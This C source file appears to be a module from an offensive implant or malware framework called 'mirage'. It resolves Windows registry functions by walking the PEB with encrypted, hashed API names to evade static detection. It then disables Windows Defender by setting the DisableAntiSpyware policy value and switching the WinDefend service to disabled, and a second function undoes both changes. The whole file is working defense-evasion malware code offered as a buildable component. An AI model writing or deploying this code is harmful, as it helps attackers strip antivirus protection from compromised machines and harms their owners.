#include "defender_disable.h"
#include "config.h"
#include "nt_types.h"

#ifdef ENABLE_DEFENDER_DISABLE
#include "hash.h"
#include "peb.h"
#include "export_resolve.h"
#include "enc_strings.h"
#include <string.h>
#include <windows.h>

/* ── PEB-walk API resolution (advapi32.dll) ─────────────────── */

typedef LONG (WINAPI *pRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, DWORD, PHKEY);
typedef LONG (WINAPI *pRegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG (WINAPI *pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE *, DWORD);
typedef LONG (WINAPI *pRegDeleteKeyW)(HKEY, LPCWSTR);
typedef LONG (WINAPI *pRegDeleteValueW)(HKEY, LPCWSTR);
typedef LONG (WINAPI *pRegCloseKey)(HKEY);

static struct {
    pRegOpenKeyExW    pRegOpenKeyExW;
    pRegCreateKeyExW  pRegCreateKeyExW;
    pRegSetValueExW   pRegSetValueExW;
    pRegDeleteKeyW    pRegDeleteKeyW;
    pRegDeleteValueW  pRegDeleteValueW;
    pRegCloseKey      pRegCloseKey;
    int               ready;
} g_dd_api;

static int dd_ensure_api(void) {
    if (g_dd_api.ready) return 1;
    char dll[32]; enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, dll);
    void *mod = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!mod) return 0;

    char fn[32];
    enc_decrypt(enc_RegOpenKeyExW, ENC_REGOPENKEYEXW_LEN, fn);
    g_dd_api.pRegOpenKeyExW = (pRegOpenKeyExW)mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegCreateKeyExW, ENC_REGCREATEKEYEXW_LEN, fn);
    g_dd_api.pRegCreateKeyExW = (pRegCreateKeyExW)mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegSetValueExW, ENC_REGSETVALUEEXW_LEN, fn);
    g_dd_api.pRegSetValueExW = (pRegSetValueExW)mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegDeleteKeyW, ENC_REGDELETEKEYW_LEN, fn);
    g_dd_api.pRegDeleteKeyW = (pRegDeleteKeyW)mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegCloseKey, ENC_REGCLOSEKEY_LEN, fn);
    g_dd_api.pRegCloseKey = (pRegCloseKey)mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(fn));

    /* RegDeleteValueW — resolve via encrypted string */
    char fn2[32];
    enc_decrypt(enc_RegDeleteValueW, ENC_REGDELETEVALUEW_LEN, fn2);
    g_dd_api.pRegDeleteValueW = (pRegDeleteValueW)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn2));

    if (!g_dd_api.pRegOpenKeyExW || !g_dd_api.pRegCreateKeyExW ||
        !g_dd_api.pRegSetValueExW || !g_dd_api.pRegDeleteKeyW ||
        !g_dd_api.pRegCloseKey || !g_dd_api.pRegDeleteValueW)
        return 0;

    g_dd_api.ready = 1;
    return 1;
}

/* ── Disable Windows Defender via registry ──────────────────── */

mirage_defender_result mirage_disable_defender(void) {
    if (!dd_ensure_api()) return 1;

    HKEY hKey;
    LONG result;

    /* Decrypt registry path: SOFTWARE\Policies\Microsoft\Windows Defender */
    wchar_t wreg_def[128];
    enc_decrypt_wide(enc_wreg_defender, ENC_WREG_DEFENDER_LEN, wreg_def);

    /* Disable Real-time Monitoring */
    result = g_dd_api.pRegOpenKeyExW(HKEY_LOCAL_MACHINE,
        wreg_def, 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD val = 1;
        g_dd_api.pRegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD,
                                 (BYTE*)&val, sizeof(val));
        g_dd_api.pRegCloseKey(hKey);
    }

    /* Disable via services */
    result = g_dd_api.pRegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD val = 4; /* SERVICE_DISABLED */
        g_dd_api.pRegSetValueExW(hKey, L"Start", 0, REG_DWORD,
                                 (BYTE*)&val, sizeof(val));
        g_dd_api.pRegCloseKey(hKey);
    }

    return 0;
}

/* ── Re-enable Windows Defender ────────────────────────────── */

int mirage_defender_enable(void) {
    if (!dd_ensure_api()) return 1;

    HKEY hKey;
    LONG result;

    wchar_t wreg_def[128];
    enc_decrypt_wide(enc_wreg_defender, ENC_WREG_DEFENDER_LEN, wreg_def);

    result = g_dd_api.pRegOpenKeyExW(HKEY_LOCAL_MACHINE,
        wreg_def, 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        g_dd_api.pRegDeleteValueW(hKey, L"DisableAntiSpyware");
        g_dd_api.pRegCloseKey(hKey);
    }

    result = g_dd_api.pRegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD val = 2; /* SERVICE_AUTO_START */
        g_dd_api.pRegSetValueExW(hKey, L"Start", 0, REG_DWORD,
                                 (BYTE*)&val, sizeof(val));
        g_dd_api.pRegCloseKey(hKey);
    }

    return 0;
}

#endif /* ENABLE_DEFENDER_DISABLE */
